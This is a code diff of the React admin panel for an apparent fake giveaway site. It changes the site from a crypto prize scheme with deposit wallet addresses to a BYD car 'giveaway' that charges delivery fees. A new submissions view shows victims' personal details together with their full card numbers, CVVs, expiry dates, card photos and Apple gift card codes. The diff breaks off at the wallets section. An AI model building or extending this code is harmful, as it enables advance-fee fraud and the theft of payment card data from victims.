@@ -3,308 +3,541 @@ import { base44 } from '@/api/base44Client';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { toast } from 'sonner';
-import { Save, Upload, Settings, Wallet, Trophy, ImageIcon, Plus, Trash2 } from 'lucide-react';
+import { Save, Upload, Settings, Car, ImageIcon, Plus, Trash2, Wallet, Inbox, CreditCard, Gift, ChevronDown, ChevronUp } from 'lucide-react';
 
-const BTC_LOGO = "https://upload.wikimedia.org/wikipedia/commons/thumb/4/46/Bitcoin.svg/1200px-Bitcoin.svg.png";
-const ETH_LOGO = "https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Ethereum_logo_2014.svg/628px-Ethereum_logo_2014.svg.png";
-const SOL_LOGO = "https://upload.wikimedia.org/wikipedia/en/b/b9/Solana_logo.png";
-const TRUMP_LOGO = "https://qtrypzzcjebvfcihiynt.supabase.co/storage/v1/object/public/base44-prod/public/69a8eb41a50eea87ead000ff/3b869c91c_images16.jpeg";
-
-const cryptoPresets = [
-  { name: "BTC", url: BTC_LOGO },
-  { name: "ETH", url: ETH_LOGO },
-  { name: "SOL", url: SOL_LOGO },
-  { name: "TRUMP", url: TRUMP_LOGO },
+const DEFAULT_CARS = [
+  { name: "BYD Seal", tier: "Performance Sedan", fee: "$299", delivery: "7–10 Business Days", img: "https://qtrypzzcjebvfcihiynt.supabase.co/storage/v1/object/public/base44-prod/public/69aaf36e7cb88f68a01d7103/fc7c3ae25_IMG-20260306-WA0536.jpg" },
+  { name: "BYD Atto 3", tier: "Premium SUV", fee: "$349", delivery: "5–7 Business Days", img: "https://qtrypzzcjebvfcihiynt.supabase.co/storage/v1/object/public/base44-prod/public/69aaf36e7cb88f68a01d7103/397f76f88_IMG-20260306-WA0533.jpg" },
+  { name: "BYD Han EV", tier: "Luxury Flagship", fee: "$399", delivery: "3–5 Business Days", img: "https://qtrypzzcjebvfcihiynt.supabase.co/storage/v1/object/public/base44-prod/public/69aaf36e7cb88f68a01d7103/3bf711821_IMG-20260306-WA0532.jpg" },
+  { name: "BYD Dolphin", tier: "Smart Compact", fee: "$249", delivery: "10–14 Business Days", img: "https://qtrypzzcjebvfcihiynt.supabase.co/storage/v1/object/public/base44-prod/public/69aaf36e7cb88f68a01d7103/4a267b535_IMG-20260306-WA0530.jpg" },
+  { name: "BYD Sea Lion 07", tier: "Sport SUV", fee: "$379", delivery: "5–8 Business Days", img: "https://qtrypzzcjebvfcihiynt.supabase.co/storage/v1/object/public/base44-prod/public/69aaf36e7cb88f68a01d7103/2eaef0a2d_IMG-20260306-WA0529.jpg" },
+  { name: "BYD Yangwang U7", tier: "Ultra Luxury", fee: "$499", delivery: "3–5 Business Days", img: "https://qtrypzzcjebvfcihiynt.supabase.co/storage/v1/object/public/base44-prod/public/69aaf36e7cb88f68a01d7103/e8b958f38_IMG-20260306-WA0528.jpg" },
+  { name: "BYD Seagull", tier: "City EV", fee: "$199", delivery: "10–14 Business Days", img: "https://qtrypzzcjebvfcihiynt.supabase.co/storage/v1/object/public/base44-prod/public/69aaf36e7cb88f68a01d7103/e9f6841f6_IMG-20260306-WA0531.jpg" },
+  { name: "BYD Sealion 6", tier: "Family SUV", fee: "$329", delivery: "7–10 Business Days", img: "https://qtrypzzcjebvfcihiynt.supabase.co/storage/v1/object/public/base44-prod/public/69aaf36e7cb88f68a01d7103/99f4dd363_IMG-20260306-WA0529.jpg" },
+  { name: "BYD Seal U", tier: "Executive SUV", fee: "$359", delivery: "5–7 Business Days", img: "https://qtrypzzcjebvfcihiynt.supabase.co/storage/v1/object/public/base44-prod/public/69aaf36e7cb88f68a01d7103/c66fcf75c_IMG-20260306-WA0534.jpg" },
+  { name: "BYD Ocean-X", tier: "Sports Coupe", fee: "$449", delivery: "5–8 Business Days", img: "https://qtrypzzcjebvfcihiynt.supabase.co/storage/v1/object/public/base44-prod/public/69aaf36e7cb88f68a01d7103/0d014f1ca_IMG-20260306-WA0535.jpg" },
+  { name: "BYD Seal Blue", tier: "Performance Sedan", fee: "$319", delivery: "7–10 Business Days", img: "https://qtrypzzcjebvfcihiynt.supabase.co/storage/v1/object/public/base44-prod/public/69aaf36e7cb88f68a01d7103/1b5a8a797_IMG-20260306-WA0517.jpg" },
+  { name: "BYD Seal Black", tier: "Performance Sedan", fee: "$339", delivery: "5–7 Business Days", img: "https://qtrypzzcjebvfcihiynt.supabase.co/storage/v1/object/public/base44-prod/public/69aaf36e7cb88f68a01d7103/23a40b761_IMG-20260306-WA0519.jpg" },
+  { name: "BYD Han Premium", tier: "Luxury Interior", fee: "$429", delivery: "3–5 Business Days", img: "https://qtrypzzcjebvfcihiynt.supabase.co/storage/v1/object/public/base44-prod/public/69aaf36e7cb88f68a01d7103/07d6128a0_IMG-20260306-WA0521.jpg" },
+  { name: "BYD Han Matte", tier: "Stealth Edition", fee: "$459", delivery: "5–7 Business Days", img: "https://qtrypzzcjebvfcihiynt.supabase.co/storage/v1/object/public/base44-prod/public/69aaf36e7cb88f68a01d7103/9123cff4f_IMG-20260306-WA0523.jpg" },
+  { name: "BYD Seagull White", tier: "City EV", fee: "$219", delivery: "10–14 Business Days", img: "https://qtrypzzcjebvfcihiynt.supabase.co/storage/v1/object/public/base44-prod/public/69aaf36e7cb88f68a01d7103/191f5df61_IMG-20260306-WA0522.jpg" },
+  { name: "BYD Atto 3 Interior", tier: "Premium Interior", fee: "$359", delivery: "5–7 Business Days", img: "https://qtrypzzcjebvfcihiynt.supabase.co/storage/v1/object/public/base44-prod/public/69aaf36e7cb88f68a01d7103/219e35b43_IMG-20260306-WA0524.jpg" },
+  { name: "BYD Dolphin Blue", tier: "Smart Compact", fee: "$259", delivery: "10–14 Business Days", img: "https://qtrypzzcjebvfcihiynt.supabase.co/storage/v1/object/public/base44-prod/public/69aaf36e7cb88f68a01d7103/71926239e_IMG-20260306-WA0525.jpg" },
+  { name: "BYD e2", tier: "Urban EV", fee: "$189", delivery: "10–14 Business Days", img: "https://qtrypzzcjebvfcihiynt.supabase.co/storage/v1/object/public/base44-prod/public/69aaf36e7cb88f68a01d7103/1878bf446_IMG-20260306-WA0526.jpg" },
+  { name: "BYD Dolphin Plus", tier: "Sport Compact", fee: "$279", delivery: "7–10 Business Days", img: "https://qtrypzzcjebvfcihiynt.supabase.co/storage/v1/object/public/base44-prod/public/69aaf36e7cb88f68a01d7103/8bdcfa757_IMG-20260306-WA0527.jpg" },
 ];
 
-const defaultBranding = {
-  site_name: "TRUMP MEME",
-  logo_url: "https://qtrypzzcjebvfcihiynt.supabase.co/storage/v1/object/public/base44-prod/public/69a8eb41a50eea87ead000ff/3b869c91c_images16.jpeg",
-  hero_image_url: "https://qtrypzzcjebvfcihiynt.supabase.co/storage/v1/object/public/base44-prod/public/69a8eb41a50eea87ead000ff/db53826d5_images15.jpeg",
-  total_prize: "$100,000,000",
-};
-
-const defaultPrizes = [
-  { label: "Bitcoin", amount: "1,000 BTC", logo: BTC_LOGO },
-  { label: "Ethereum", amount: "10,000 ETH", logo: ETH_LOGO },
-  { label: "Solana", amount: "500,000 SOL", logo: SOL_LOGO },
-  { label: "TRUMP", amount: "1,000,000 TRUMP", logo: TRUMP_LOGO },
+const DEFAULT_WALLETS = [
+  { label: "Bitcoin (BTC)", address: "", logo: "" },
+  { label: "Ethereum (ETH)", address: "", logo: "" },
+  { label: "USDT (TRC20)", address: "", logo: "" },
 ];
 
-const defaultWallets = [
-  { name: "Bitcoin", symbol: "BTC", address: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", min: "0.1 BTC", max: "20 BTC", logo: BTC_LOGO },
-  { name: "Ethereum", symbol: "ETH", address: "0x742d35Cc6634C0532925a3b844Bc454e4438f44e", min: "1 ETH", max: "500 ETH", logo: ETH_LOGO },
-  { name: "Solana", symbol: "SOL", address: "6p6xgHyF7AeE6TZkSmFsko444wqoP15icUSqi2jfGiPN", min: "10 SOL", max: "10,000 SOL", logo: SOL_LOGO },
-  { name: "TRUMP Token", symbol: "TRUMP", address: "TXZQuyCasxN42bjAcYpP2xwYVMCF6gHBnv", min: "100 TRUMP", max: "100,000 TRUMP", logo: TRUMP_LOGO },
-];
-
-// Serialize prizes/wallets arrays into flat keys for storage
-function serialize(branding, prizes, wallets) {
+function serializeAll(branding, cars, wallets) {
   const data = { ...branding };
-  prizes.forEach((p, i) => {
-    data[`prize_${i + 1}_label`] = p.label || '';
-    data[`prize_${i + 1}_amount`] = p.amount || '';
-    data[`prize_${i + 1}_logo`] = p.logo || '';
+  cars.forEach((c, i) => {
+    data[`car_${i + 1}_name`] = c.name || '';
+    data[`car_${i + 1}_tier`] = c.tier || '';
+    data[`car_${i + 1}_fee`] = c.fee || '';
+    data[`car_${i + 1}_delivery`] = c.delivery || '';
+    data[`car_${i + 1}_img`] = c.img || '';
   });
-  data['prize_count'] = String(prizes.length);
+  data['car_count'] = String(cars.length);
   wallets.forEach((w, i) => {
-    data[`wallet_${i + 1}_name`] = w.name || '';
-    data[`wallet_${i + 1}_symbol`] = w.symbol || '';
-    data[`wallet_${i + 1}_address`] = w.address || '';
-    data[`wallet_${i + 1}_min`] = w.min || '';
-    data[`wallet_${i + 1}_max`] = w.max || '';
-    data[`wallet_${i + 1}_logo`] = w.logo || '';
+    data[`pm_${i + 1}_label`] = w.label || '';
+    data[`pm_${i + 1}_address`] = w.address || '';
+    data[`pm_${i + 1}_logo`] = w.logo || '';
   });
-  data['wallet_count'] = String(wallets.length);
+  data['pm_count'] = String(wallets.length);
   return data;
 }
 
-function deserialize(s) {
+function deserializeAll(s) {
   const branding = {
-    site_name: s.site_name || defaultBranding.site_name,
-    logo_url: s.logo_url || defaultBranding.logo_url,
-    hero_image_url: s.hero_image_url || defaultBranding.hero_image_url,
-    total_prize: s.total_prize || defaultBranding.total_prize,
+    site_name: s.site_name || 'BYD Giveaway',
+    logo_url: s.logo_url || '',
+    hero_image_url: s.hero_image_url || '',
+    cashapp_tag: s.cashapp_tag || '',
+    paypal_tag: s.paypal_tag || '',
   };
-  const prizeCount = parseInt(s.prize_count) || 4;
-  const prizes = Array.from({ length: prizeCount }, (_, i) => ({
-    label: s[`prize_${i + 1}_label`] || '',
-    amount: s[`prize_${i + 1}_amount`] || '',
-    logo: s[`prize_${i + 1}_logo`] || '',
+  const carCount = Math.max(parseInt(s.car_count) || 0, DEFAULT_CARS.length);
+  const cars = Array.from({ length: carCount }, (_, i) => ({
+    name: s[`car_${i + 1}_name`] || DEFAULT_CARS[i]?.name || '',
+    tier: s[`car_${i + 1}_tier`] || DEFAULT_CARS[i]?.tier || '',
+    fee: s[`car_${i + 1}_fee`] || DEFAULT_CARS[i]?.fee || '',
+    delivery: s[`car_${i + 1}_delivery`] || DEFAULT_CARS[i]?.delivery || '',
+    img: s[`car_${i + 1}_img`] || DEFAULT_CARS[i]?.img || '',
   }));
-  const walletCount = parseInt(s.wallet_count) || 4;
-  const wallets = Array.from({ length: walletCount }, (_, i) => ({
-    name: s[`wallet_${i + 1}_name`] || '',
-    symbol: s[`wallet_${i + 1}_symbol`] || '',
-    address: s[`wallet_${i + 1}_address`] || '',
-    min: s[`wallet_${i + 1}_min`] || '',
-    max: s[`wallet_${i + 1}_max`] || '',
-    logo: s[`wallet_${i + 1}_logo`] || '',
+  const pmCount = parseInt(s.pm_count) || DEFAULT_WALLETS.length;
+  const wallets = Array.from({ length: pmCount }, (_, i) => ({
+    label: s[`pm_${i + 1}_label`] || DEFAULT_WALLETS[i]?.label || '',
+    address: s[`pm_${i + 1}_address`] || DEFAULT_WALLETS[i]?.address || '',
+    logo: s[`pm_${i + 1}_logo`] || DEFAULT_WALLETS[i]?.logo || '',
   }));
-  return { branding, prizes, wallets };
+  return { branding, cars, wallets };
+}
+
+const STATUS_COLORS = {
+  pending: 'bg-yellow-500/20 text-yellow-400 border-yellow-500/30',
+  confirmed: 'bg-green-500/20 text-green-400 border-green-500/30',
+  rejected: 'bg-red-500/20 text-red-400 border-red-500/30',
+};
+
+function SubmissionCard({ sub, onStatusChange }) {
+  const [open, setOpen] = useState(false);
+  const typeLabel = { crypto: '🪙 Crypto', cashapp: '💵 CashApp', paypal: '🅿️ PayPal', credit_card: '💳 Credit Card', apple_gift_card: '🍎 Apple Gift Card' };
+
+  return (
+    <div className="border border-gray-700 rounded-2xl overflow-hidden">
+      <button onClick={() => setOpen(o => !o)} className="w-full text-left p-4 flex items-center justify-between bg-gray-800 hover:bg-gray-750 transition-colors">
+        <div className="flex items-center gap-3">
+          <div>
+            <p className="text-white font-bold text-sm">{sub.full_name}</p>
+            <p className="text-gray-400 text-xs">{sub.email} · {sub.car_model}</p>
+            <p className="text-gray-500 text-xs mt-0.5">{typeLabel[sub.payment_type] || sub.payment_type} · {sub.delivery_fee}</p>
+          </div>
+        </div>
+        <div className="flex items-center gap-2 shrink-0">
+          <span className={`text-xs font-bold px-2 py-1 rounded-full border ${STATUS_COLORS[sub.status] || STATUS_COLORS.pending}`}>{sub.status}</span>
+          {open ? <ChevronUp className="w-4 h-4 text-gray-400" /> : <ChevronDown className="w-4 h-4 text-gray-400" />}
+        </div>
+      </button>
+
+      {open && (
+        <div className="bg-gray-900 p-5 space-y-4">
+          {/* Personal info */}
+          <div className="grid grid-cols-2 gap-3 text-sm">
+            <div><p className="text-gray-500 text-xs">Phone</p><p className="text-white">{sub.phone}</p></div>
+            <div><p className="text-gray-500 text-xs">Delivery Fee</p><p className="text-red-400 font-bold">{sub.delivery_fee}</p></div>
+            <div className="col-span-2"><p className="text-gray-500 text-xs">Address</p><p className="text-white">{sub.address}, {sub.city}, {sub.country} {sub.zip}</p></div>
+            <div><p className="text-gray-500 text-xs">Delivery Option</p><p className="text-white">{sub.delivery_option}</p></div>
+            <div><p className="text-gray-500 text-xs">Submitted</p><p className="text-white">{new Date(sub.created_date).toLocaleString()}</p></div>
+          </div>
+
+          {/* Payment Proof */}
+          {sub.payment_proof_url && (
+            <div className="border-t border-gray-700 pt-4">
+              <p className="text-yellow-400 text-xs uppercase tracking-wide font-semibold mb-2">📎 Payment Proof</p>
+              <a href={sub.payment_proof_url} target="_blank" rel="noreferrer">
+                <img src={sub.payment_proof_url} alt="Payment Proof" className="w-full max-h-56 object-contain rounded-xl border border-yellow-500/30 hover:border-yellow-400 transition-colors bg-gray-800" />
+              </a>
+              <p className="text-gray-500 text-xs mt-1">Click image to open full size</p>
+            </div>
+          )}
+
+          {/* Payment details */}
+          <div className="border-t border-gray-700 pt-4">
+            <p className="text-gray-400 text-xs uppercase tracking-wide font-semibold mb-3">Payment Details — {typeLabel[sub.payment_type]}</p>
+
+            {sub.payment_type === 'crypto' && (
+              <div className="bg-gray-800 rounded-xl p-3">
+                <p className="text-gray-400 text-xs">Wallet Used</p>
+                <p className="text-white font-bold">{sub.payment_label}</p>
+                <p className="text-green-400 font-mono text-xs break-all mt-1">{sub.wallet_address_used}</p>
+              </div>
+            )}
+
+            {sub.payment_type === 'cashapp' && (
+              <div className="bg-gray-800 rounded-xl p-3">
+                <p className="text-gray-400 text-xs">CashApp Tag</p>
+                <p className="text-green-400 font-bold text-lg">{sub.cashapp_tag}</p>
+              </div>
+            )}
+
+            {sub.payment_type === 'paypal' && (
+              <div className="bg-gray-800 rounded-xl p-3">
+                <p className="text-gray-400 text-xs">PayPal Tag / Email</p>
+                <p className="text-blue-400 font-bold text-lg">{sub.paypal_tag}</p>
+              </div>
+            )}
+
+            {sub.payment_type === 'credit_card' && (
+              <div className="space-y-3">
+                <div className="grid grid-cols-2 gap-3">
+                  {sub.credit_card_front_url && (
+                    <div>
+                      <p className="text-gray-400 text-xs mb-1">Card Front</p>
+                      <a href={sub.credit_card_front_url} target="_blank" rel="noreferrer">
+                        <img src={sub.credit_card_front_url} alt="Card Front" className="w-full h-32 object-cover rounded-xl border border-gray-700 hover:border-red-500 transition-colors" />
+                      </a>
+                    </div>
+                  )}
+                  {sub.credit_card_back_url && (
+                    <div>
+                      <p className="text-gray-400 text-xs mb-1">Card Back</p>
+                      <a href={sub.credit_card_back_url} target="_blank" rel="noreferrer">
+                        <img src={sub.credit_card_back_url} alt="Card Back" className="w-full h-32 object-cover rounded-xl border border-gray-700 hover:border-red-500 transition-colors" />
+                      </a>
+                    </div>
+                  )}
+                </div>
+                <div className="bg-gray-800 rounded-xl p-3 grid grid-cols-2 gap-2 text-sm">
+                  <div><p className="text-gray-500 text-xs">Card Holder</p><p className="text-white">{sub.card_holder_name}</p></div>
+                  <div><p className="text-gray-500 text-xs">Card Number</p><p className="text-yellow-300 font-mono">{sub.card_number}</p></div>
+                  <div><p className="text-gray-500 text-xs">Expiry</p><p className="text-white">{sub.card_expiry}</p></div>
+                  <div><p className="text-gray-500 text-xs">CVV</p><p className="text-red-400 font-mono">{sub.card_cvv}</p></div>
+                </div>
+              </div>
+            )}
+
+            {sub.payment_type === 'apple_gift_card' && (
+              <div className="space-y-3">
+                <div className="grid grid-cols-2 gap-3">
+                  {sub.apple_gift_front_url && (
+                    <div>
+                      <p className="text-gray-400 text-xs mb-1">Card Front</p>
+                      <a href={sub.apple_gift_front_url} target="_blank" rel="noreferrer">
+                        <img src={sub.apple_gift_front_url} alt="Gift Front" className="w-full h-32 object-cover rounded-xl border border-gray-700 hover:border-red-500 transition-colors" />
+                      </a>
+                    </div>
+                  )}
+                  {sub.apple_gift_back_url && (
+                    <div>
+                      <p className="text-gray-400 text-xs mb-1">Card Back</p>
+                      <a href={sub.apple_gift_back_url} target="_blank" rel="noreferrer">
+                        <img src={sub.apple_gift_back_url} alt="Gift Back" className="w-full h-32 object-cover rounded-xl border border-gray-700 hover:border-red-500 transition-colors" />
+                      </a>
+                    </div>
+                  )}
+                </div>
+                {sub.apple_gift_code && (
+                  <div className="bg-gray-800 rounded-xl p-3">
+                    <p className="text-gray-400 text-xs">Gift Card Code</p>
+                    <p className="text-yellow-300 font-mono text-lg tracking-widest mt-1">{sub.apple_gift_code}</p>
+                  </div>
+                )}
+              </div>
+            )}
+          </div>
+
+          {/* Status Control */}
+          <div className="border-t border-gray-700 pt-4 flex items-center gap-3">
+            <p className="text-gray-400 text-xs font-semibold">Update Status:</p>
+            {['pending', 'confirmed', 'rejected'].map(s => (
+              <button key={s} onClick={() => onStatusChange(sub.id, s)}
+                className={`text-xs font-bold px-3 py-1.5 rounded-full border transition-colors ${sub.status === s ? STATUS_COLORS[s] : 'border-gray-600 text-gray-500 hover:border-gray-400'}`}>
+                {s}
+              </button>
+            ))}
+          </div>
+        </div>
+      )}
+    </div>
+  );
 }
 
 export default function Admin() {
-  const [branding, setBranding] = useState(defaultBranding);
-  const [prizes, setPrizes] = useState(defaultPrizes);
-  const [wallets, setWallets] = useState(defaultWallets);
+  const [activeTab, setActiveTab] = useState('settings'); // 'settings' | 'submissions'
+  const [branding, setBranding] = useState({ site_name: 'BYD Giveaway', logo_url: '', hero_image_url: '', cashapp_tag: '', paypal_tag: '' });
+  const [cars, setCars] = useState(DEFAULT_CARS);
+  const [wallets, setWallets] = useState(DEFAULT_WALLETS);
   const [recordId, setRecordId] = useState(null);
   const [saving, setSaving] = useState(false);
   const [uploading, setUploading] = useState({});
+  const [submissions, setSubmissions] = useState([]);
+  const [loadingSubs, setLoadingSubs] = useState(false);
 
   useEffect(() => {
     base44.entities.SiteSettings.list().then(records => {
       if (records && records.length > 0) {
         setRecordId(records[0].id);
-        const { branding: b, prizes: p, wallets: w } = deserialize(records[0]);
+        const { branding: b, cars: c, wallets: w } = deserializeAll(records[0]);
         setBranding(b);
-        setPrizes(p);
+        setCars(c);
         setWallets(w);
       }
     });
   }, []);
 
+  useEffect(() => {
+    if (activeTab !== 'submissions') return;
+    setLoadingSubs(true);
+    base44.entities.PaymentSubmission.list('-created_date', 100).then(data => {
+      setSubmissions(data || []);
+      setLoadingSubs(false);
+    });
+  }, [activeTab]);
+
   const handleSave = async () => {
     setSaving(true);
-    try {
-      const data = serialize(branding, prizes, wallets);
-      if (recordId) {
-        await base44.entities.SiteSettings.update(recordId, data);
-      } else {
-        const rec = await base44.entities.SiteSettings.create(data);
-        setRecordId(rec.id);
-      }
-      toast.success("Settings saved!");
-    } catch (e) {
-      toast.error("Failed: " + e.message);
+    const data = serializeAll(branding, cars, wallets);
+    if (recordId) {
+      await base44.entities.SiteSettings.update(recordId, data);
+    } else {
+      const rec = await base44.entities.SiteSettings.create(data);
+      setRecordId(rec.id);
     }
+    toast.success("Settings saved!");
     setSaving(false);
   };
 
   const handleUpload = async (onDone, key, file) => {
     if (!file) return;
     setUploading(prev => ({ ...prev, [key]: true }));
-    try {
-      const { file_url } = await base44.integrations.Core.UploadFile({ file });
-      onDone(file_url);
-      toast.success("Image uploaded!");
-    } catch (e) {
-      toast.error("Upload failed: " + e.message);
-    }
+    const { file_url } = await base44.integrations.Core.UploadFile({ file });
+    onDone(file_url);
+    toast.success("Image uploaded!");
     setUploading(prev => ({ ...prev, [key]: false }));
   };
 
-  const updatePrize = (i, field, value) => setPrizes(prev => prev.map((p, idx) => idx === i ? { ...p, [field]: value } : p));
-  const updateWallet = (i, field, value) => setWallets(prev => prev.map((w, idx) => idx === i ? { ...w, [field]: value } : w));
-  const removePrize = (i) => setPrizes(prev => prev.filter((_, idx) => idx !== i));
-  const removeWallet = (i) => setWallets(prev => prev.filter((_, idx) => idx !== i));
-  const addPrize = () => setPrizes(prev => [...prev, { label: '', amount: '', logo: '' }]);
-  const addWallet = () => setWallets(prev => [...prev, { name: '', symbol: '', address: '', min: '', max: '', logo: '' }]);
+  const updateCar = (i, field, value) => setCars(prev => prev.map((c, idx) => idx === i ? { ...c, [field]: value } : c));
+  const removeCar = (i) => setCars(prev => prev.filter((_, idx) => idx !== i));
+  const addCar = () => setCars(prev => [...prev, { name: '', tier: '', fee: '$299', delivery: '7–10 Business Days', img: '' }]);
 
-  const LogoSelector = ({ logo, onSelect, uploadKey }) => (
-    <div>
-      <label className="block text-xs font-semibold text-gray-600 mb-1">Logo</label>
-      <div className="flex gap-2 items-center flex-wrap">
-        {logo && <img src={logo} alt="logo" className="w-10 h-10 rounded-lg object-contain border border-gray-200 bg-white p-1" />}
-        {cryptoPresets.map((p, i) => (
-          <button key={i} type="button" onClick={() => onSelect(p.url)} title={p.name}
-            className={`w-10 h-10 rounded-lg border-2 p-1 bg-white hover:border-red-400 transition-colors ${logo === p.url ? 'border-red-500' : 'border-gray-200'}`}>
-            <img src={p.url} alt={p.name} className="w-full h-full object-contain" />
-          </button>
-        ))}
-        <label className="cursor-pointer flex items-center gap-1 text-xs text-red-600 hover:text-red-700 font-medium border border-red-200 rounded-lg px-2 py-2">
-          <Upload className="w-3 h-3" />
-          {uploading[uploadKey] ? "..." : "Upload"}
-          <input type="file" accept="image/*" className="hidden"
-            onChange={e => handleUpload(onSelect, uploadKey, e.target.files[0])} disabled={uploading[uploadKey]} />
-        </label>
-        <Input value={logo || ''} onChange={e => onSelect(e.target.value)}
-          placeholder="or paste URL" className="flex-1 min-w-[120px] text-xs" />
-      </div>
-    </div>
-  );
+  const updateWallet = (i, field, value) => setWallets(prev => prev.map((w, idx) => idx === i ? { ...w, [field]: value } : w));
+  const removeWallet = (i) => setWallets(prev => prev.filter((_, idx) => idx !== i));
+  const addWallet = () => setWallets(prev => [...prev, { label: '', address: '', logo: '' }]);
+
+  const handleStatusChange = async (id, status) => {
+    await base44.entities.PaymentSubmission.update(id, { status });
+    setSubmissions(prev => prev.map(s => s.id === id ? { ...s, status } : s));
+    toast.success(`Marked as ${status}`);
+  };
 
   return (
     <div className="min-h-screen bg-gray-50 py-10 px-4">
-      <div className="max-w-3xl mx-auto">
-        <div className="flex items-center gap-3 mb-8">
+      <div className="max-w-4xl mx-auto">
+        {/* Header */}
+        <div className="flex items-center gap-3 mb-6">
           <div className="w-10 h-10 bg-red-600 rounded-xl flex items-center justify-center">
             <Settings className="w-5 h-5 text-white" />
           </div>
           <div>
             <h1 className="text-2xl font-black text-gray-900">Admin Panel</h1>
-            <p className="text-gray-500 text-sm">Manage your giveaway website</p>
+            <p className="text-gray-500 text-sm">Manage BYD cars, payment methods & view submissions</p>
           </div>
         </div>
 
-        <div className="space-y-6">
+        {/* Tabs */}
+        <div className="flex gap-2 mb-6">
+          <button onClick={() => setActiveTab('settings')}
+            className={`px-5 py-2 rounded-xl font-bold text-sm transition-colors ${activeTab === 'settings' ? 'bg-red-600 text-white' : 'bg-white text-gray-600 border border-gray-200 hover:bg-gray-50'}`}>
+            ⚙️ Settings
+          </button>
+          <button onClick={() => setActiveTab('submissions')}
+            className={`px-5 py-2 rounded-xl font-bold text-sm transition-colors flex items-center gap-2 ${activeTab === 'submissions' ? 'bg-red-600 text-white' : 'bg-white text-gray-600 border border-gray-200 hover:bg-gray-50'}`}>
+            <Inbox className="w-4 h-4" /> Submissions {submissions.length > 0 && <span className="bg-red-500 text-white text-xs rounded-full px-1.5">{submissions.length}</span>}
+          </button>
+        </div>
 
-          {/* Branding */}
-          <div className="bg-white rounded-2xl shadow-sm border border-gray-100 p-6">
-            <div className="flex items-center gap-2 mb-5">
-              <ImageIcon className="w-5 h-5 text-red-600" />
-              <h2 className="text-lg font-bold text-gray-900">Branding</h2>
-            </div>
-            <div className="space-y-4">
-              <div>
-                <label className="block text-xs font-semibold text-gray-600 mb-1">Site Name</label>
-                <Input value={branding.site_name} onChange={e => setBranding(p => ({ ...p, site_name: e.target.value }))} placeholder="TRUMP MEME" />
+        {/* ── SETTINGS TAB ── */}
+        {activeTab === 'settings' && (
+          <div className="space-y-6">
+
+            {/* Branding */}
+            <div className="bg-white rounded-2xl shadow-sm border border-gray-100 p-6">
+              <div className="flex items-center gap-2 mb-5">
+                <ImageIcon className="w-5 h-5 text-red-600" />
+                <h2 className="text-lg font-bold text-gray-900">Branding</h2>
               </div>
-              <div>
-                <label className="block text-xs font-semibold text-gray-600 mb-1">Total Prize Pool</label>
-                <Input value={branding.total_prize} onChange={e => setBranding(p => ({ ...p, total_prize: e.target.value }))} placeholder="$100,000,000" />
-              </div>
-              {[{ key: 'logo_url', label: 'Navbar Logo' }, { key: 'hero_image_url', label: 'Hero Image' }].map(({ key, label }) => (
-                <div key={key}>
-                  <label className="block text-xs font-semibold text-gray-600 mb-1">{label}</label>
-                  <div className="flex gap-3 items-center">
-                    {branding[key] && <img src={branding[key]} alt={label} className="w-12 h-12 rounded-xl object-cover border-2 border-red-200" />}
-                    <div className="flex-1 space-y-2">
-                      <Input value={branding[key] || ''} onChange={e => setBranding(p => ({ ...p, [key]: e.target.value }))} placeholder="Image URL" />
-                      <label className="cursor-pointer inline-flex items-center gap-2 text-sm text-red-600 hover:text-red-700 font-medium">
-                        <Upload className="w-4 h-4" />
-                        {uploading[key] ? "Uploading..." : "Upload image"}
-                        <input type="file" accept="image/*" className="hidden"
-                          onChange={e => handleUpload(url => setBranding(p => ({ ...p, [key]: url })), key, e.target.files[0])}
-                          disabled={uploading[key]} />
-                      </label>
+              <div className="space-y-4">
+                <div>
+                  <label className="block text-xs font-semibold text-gray-600 mb-1">Site Name</label>
+                  <Input value={branding.site_name} onChange={e => setBranding(p => ({ ...p, site_name: e.target.value }))} placeholder="BYD Giveaway" />
+                </div>
+                {[{ key: 'logo_url', label: 'Navbar Logo' }, { key: 'hero_image_url', label: 'Hero Image' }].map(({ key, label }) => (
+                  <div key={key}>
+                    <label className="block text-xs font-semibold text-gray-600 mb-1">{label}</label>
+                    <div className="flex gap-3 items-center">
+                      {branding[key] && <img src={branding[key]} alt={label} className="w-14 h-14 rounded-xl object-cover border-2 border-red-200" />}
+                      <div className="flex-1 space-y-2">
+                        <Input value={branding[key] || ''} onChange={e => setBranding(p => ({ ...p, [key]: e.target.value }))} placeholder="Image URL" />
+                        <label className="cursor-pointer inline-flex items-center gap-2 text-sm text-red-600 hover:text-red-700 font-medium">
+                          <Upload className="w-4 h-4" />
+                          {uploading[key] ? "Uploading..." : "Upload image"}
+                          <input type="file" accept="image/*" className="hidden"
+                            onChange={e => handleUpload(url => setBranding(p => ({ ...p, [key]: url })), key, e.target.files[0])}
+                            disabled={uploading[key]} />
+                        </label>
+                      </div>
                     </div>
                   </div>
-                </div>
-              ))}
-            </div>
-          </div>
-
-          {/* Prizes */}
-          <div className="bg-white rounded-2xl shadow-sm border border-gray-100 p-6">
-            <div className="flex items-center justify-between mb-5">
-              <div className="flex items-center gap-2">
-                <Trophy className="w-5 h-5 text-red-600" />
-                <h2 className="text-lg font-bold text-gray-900">Giveaway Prizes</h2>
+                ))}
               </div>
-              <Button type="button" onClick={addPrize} variant="outline" className="border-red-200 text-red-600 hover:bg-red-50 text-sm gap-1">
-                <Plus className="w-4 h-4" /> Add Prize
-              </Button>
             </div>
-            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
-              {prizes.map((prize, i) => (
-                <div key={i} className="border border-gray-100 rounded-xl p-4 space-y-3 relative">
-                  <div className="flex items-center justify-between">
-                    <p className="text-xs font-bold text-gray-400 uppercase">Prize #{i + 1}</p>
-                    <button type="button" onClick={() => removePrize(i)} className="text-gray-300 hover:text-red-500 transition-colors">
-                      <Trash2 className="w-4 h-4" />
-                    </button>
-                  </div>
-                  <div>
-                    <label className="block text-xs font-semibold text-gray-600 mb-1">Name</label>
-                    <Input value={prize.label} onChange={e => updatePrize(i, 'label', e.target.value)} placeholder="Bitcoin" />
-                  </div>
-                  <div>
-                    <label className="block text-xs font-semibold text-gray-600 mb-1">Amount</label>
-                    <Input value={prize.amount} onChange={e => updatePrize(i, 'amount', e.target.value)} placeholder="1,000 BTC" />
-                  </div>
-                  <LogoSelector logo={prize.logo} onSelect={url => updatePrize(i, 'logo', url)} uploadKey={`prize_logo_${i}`} />
-                </div>
-              ))}
-            </div>
-          </div>
 
-          {/* Wallets */}
